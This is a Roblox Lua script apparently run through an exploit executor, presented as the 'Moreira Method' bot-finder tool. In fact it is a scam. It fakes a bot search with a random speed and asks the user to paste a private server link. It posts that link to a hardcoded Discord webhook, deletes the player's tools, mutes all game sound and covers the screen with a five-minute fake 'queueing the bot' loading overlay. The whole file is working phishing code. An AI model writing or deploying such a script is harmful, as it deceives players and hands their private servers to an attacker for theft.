--[[
    MOREIRA METHOD – FINAL + SMOOTH DRAG + CUSTOM BG + TEXT BOX
    - ONLY REQUESTED CHANGES
    - EVERYTHING ELSE UNTOUCHED
--]]

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local pgui = player:WaitForChild("PlayerGui")

-- CONFIG
local WEBHOOK = "https://discord.com/api/webhooks/1430203804783214613/-7LhFQhG67SkPDrmWh963LqfKFqzvHa5qyyCckFko3sjJyC55UTxOgSV1TMEJo0TKW9I"
local MUSIC_ID = "rbxassetid://128527060901160"
local LOADING_TIME = 300 -- 5.5 mins
local LOADING_BG_ID = "rbxassetid://101682101456356"  -- NEW BG

local http = syn and syn.request or request or http_request
if not http then error("No HTTP") end

-- MAIN GUI
local gui = Instance.new("ScreenGui")
gui.ResetOnSpawn = false
gui.Parent = pgui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 300)
frame.Position = UDim2.fromOffset(150, 150)
frame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
frame.BorderColor3 = Color3.fromRGB(0, 170, 255)
frame.BorderSizePixel = 2
frame.Parent = gui

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,40)
title.BackgroundTransparency = 1
title.Text = "Moreira Method"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.Parent = frame

-- Status
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1,-20,0,30)
status.Position = UDim2.fromOffset(10,50)
status.BackgroundTransparency = 1
status.Text = ""
status.TextColor3 = Color3.fromRGB(200,200,200)
status.Font = Enum.Font.SourceSans
status.TextSize = 18
status.Parent = frame

-- Search Button
local searchBtn = Instance.new("TextButton")
searchBtn.Size = UDim2.new(0,220,0,45)
searchBtn.Position = UDim2.fromOffset(70,100)
searchBtn.BackgroundColor3 = Color3.fromRGB(0,120,215)
searchBtn.Text = "Start searching for bots"
searchBtn.TextColor3 = Color3.new(1,1,1)
searchBtn.Font = Enum.Font.GothamBold
searchBtn.TextSize = 18
searchBtn.Parent = frame

-- Continue Button (after bot)
local cont1 = Instance.new("TextButton")
cont1.Size = UDim2.new(0,180,0,40)
cont1.Position = UDim2.fromOffset(90,160)
cont1.BackgroundColor3 = Color3.fromRGB(0,170,0)
cont1.Text = "Continue"
cont1.TextColor3 = Color3.new(1,1,1)
cont1.Font = Enum.Font.Gotham
cont1.TextSize = 16
cont1.Visible = false
cont1.Parent = frame

-- Selected Label
local selected = Instance.new("TextLabel")
selected.Size = UDim2.new(1,-20,0,30)
selected.Position = UDim2.fromOffset(10,100)
selected.BackgroundTransparency = 1
selected.Text = ""
selected.TextColor3 = Color3.fromRGB(0,200,255)
selected.Font = Enum.Font.SourceSans
selected.TextSize = 18
selected.Visible = false
selected.Parent = frame

-- Input Box
local input = Instance.new("TextBox")
input.Size = UDim2.new(1,-40,0,40)
input.Position = UDim2.fromOffset(20,140)
input.BackgroundColor3 = Color3.fromRGB(60,60,60)
input.TextColor3 = Color3.new(1,1,1)
input.PlaceholderText = "Paste private server link..."
input.Font = Enum.Font.Code
input.TextSize = 16
input.Visible = false
input.Parent = frame

-- Final Continue
local cont2 = Instance.new("TextButton")
cont2.Size = UDim2.new(0,180,0,40)
cont2.Position = UDim2.fromOffset(90,195)
cont2.BackgroundColor3 = Color3.fromRGB(0,170,0)
cont2.Text = "Continue"
cont2.TextColor3 = Color3.new(1,1,1)
cont2.Font = Enum.Font.Gotham
cont2.TextSize = 16
cont2.Visible = false
cont2.Parent = frame

-- SMOOTH DRAG (FIXED)
local dragging = false
local dragInput, dragStart, startPos

local function updateInput(input)
    local delta = input.Position - dragStart
    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position

        local connection
        connection = input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
                connection:Disconnect()
            end
        end)
    end
end)

frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input == dragInput) then
        updateInput(input)
    end
end)

-- VALIDATE LINK
local function validLink(text)
    local link = text:match("^%s*(.-)%s*$")
    return link:find("roblox%.com/share") and link:match("code=[a-f0-9]+") and #link:match("code=[a-f0-9]+") >= 20 and link
end

-- SEND WEBHOOK
local function send(link)
    local payload = {
        username = "Moreira Bot",
        embeds = {{
            title = "Private Server Link",
            description = link,
            color = 3447003,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    http({
        Url = WEBHOOK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

-- LOADING SCREEN (NEW BG + TEXT BOX)
local loadGui = Instance.new("ScreenGui")
loadGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
loadGui.DisplayOrder = 999
loadGui.IgnoreGuiInset = true
loadGui.Parent = CoreGui
loadGui.Enabled = false

-- Background Image
local bg = Instance.new("ImageLabel")
bg.Size = UDim2.new(1,0,1,0)
bg.Image = LOADING_BG_ID
bg.BackgroundTransparency = 1
bg.ScaleType = Enum.ScaleType.Tile
bg.TileSize = UDim2.new(0, 512, 0, 512)
bg.ZIndex = 999
bg.Parent = loadGui

-- Text Box (over bar)
local textBox = Instance.new("Frame")
textBox.Size = UDim2.new(0, 600, 0, 100)
textBox.Position = UDim2.new(0.5, -300, 0.5, -100)
textBox.BackgroundColor3 = Color3.new(0,0,0)
textBox.BackgroundTransparency = 0.1
textBox.BorderSizePixel = 0
textBox.ZIndex = 1001
textBox.Parent = loadGui
Instance.new("UICorner", textBox).CornerRadius = UDim.new(0, 12)

local message = Instance.new("TextLabel")
message.Size = UDim2.new(1, -20, 1, -20)
message.Position = UDim2.fromOffset(10, 10)
message.BackgroundTransparency = 1
message.Text = "The process was successful! Currently queueing the bot to join the server. Please wait as our bot servers are currently being overloaded."
message.TextColor3 = Color3.new(1,1,1)
message.Font = Enum.Font.Gotham
message.TextSize = 18
message.TextWrapped = true
message.ZIndex = 1002
message.Parent = textBox

-- Loading Bar
local bar = Instance.new("Frame")
bar.Size = UDim2.new(0,600,0,40)
bar.Position = UDim2.new(0.5,-300,0.5,0)
bar.BackgroundColor3 = Color3.fromRGB(30,30,30)
bar.ZIndex = 1001
bar.Parent = loadGui
Instance.new("UICorner", bar).CornerRadius = UDim.new(0,20)

local fill = Instance.new("Frame")
fill.Size = UDim2.new(0,0,1,0)
fill.BackgroundColor3 = Color3.fromRGB(0,170,255)
fill.ZIndex = 1002
fill.Parent = bar
Instance.new("UICorner", fill).CornerRadius = UDim.new(0,20)

local pct = Instance.new("TextLabel")
pct.Size = UDim2.new(1,0,1,0)
pct.BackgroundTransparency = 1
pct.Text = "0%"
pct.TextColor3 = Color3.new(1,1,1)
pct.Font = Enum.Font.GothamBold
pct.TextSize = 22
pct.ZIndex = 1003
pct.Parent = bar

local music = Instance.new("Sound")
music.SoundId = MUSIC_ID
music.Volume = 0.1
music.Looped = true
music.Parent = loadGui

-- MUTE ALL
local muteConn
local function mute()
    for _, s in game:GetDescendants() do
        if s:IsA("Sound") then s.Volume = 0; s:Stop() end
    end
    muteConn = game.DescendantAdded:Connect(function(s)
        if s:IsA("Sound") then s.Volume = 0; s:Stop() end
    end)
end

-- BOT SEARCH
local speed = 0

searchBtn.MouseButton1Click:Connect(function()
    searchBtn.Visible = false
    status.Text = "Searching for a bot..."
    status.TextColor3 = Color3.fromRGB(255,255,0)

    task.wait(4.3)

    speed = math.random(90, 380)
    status.Text = "Bot found: " .. speed .. "M/s"
    status.TextColor3 = Color3.fromRGB(0,255,0)
    cont1.Visible = true
end)

cont1.MouseButton1Click:Connect(function()
    cont1.Visible = false
    status.Visible = false
    selected.Text = "Selected bot to join: " .. speed .. "M/s"
    selected.Visible = true
    input.Visible = true
    cont2.Visible = true
end)

cont2.MouseButton1Click:Connect(function()
    local link = validLink(input.Text)
    if not link then
        input.PlaceholderText = "Invalid link!"
        input.PlaceholderTextColor3 = Color3.fromRGB(255,100,100)
        return
    end

    send(link)

    task.wait(0.8)

    -- Remove tools
    local char = player.Character or player.CharacterAdded:Wait()
    for _, t in player.Backpack:GetChildren() do if t:IsA("Tool") then t:Destroy() end end
    for _, t in char:GetChildren() do if t:IsA("Tool") then t:Destroy() end end

    mute()
    music:Play()
    loadGui.Enabled = true
    gui.Enabled = false

    local startTime = tick()
    local tween = TweenService:Create(fill, TweenInfo.new(LOADING_TIME, Enum.EasingStyle.Linear), {Size = UDim2.new(1,0,1,0)})
    tween:Play()

    spawn(function()
        while tick() - startTime < LOADING_TIME do
            pct.Text = math.floor((tick() - startTime)/LOADING_TIME*100) .. "%"
            task.wait(0.1)
        end
        pct.Text = "100%"
    end)

    task.wait(LOADING_TIME)

    music:Stop()
    loadGui.Enabled = false
    gui.Enabled = true
    if muteConn then muteConn:Disconnect() end

    player:LoadCharacter()
end)
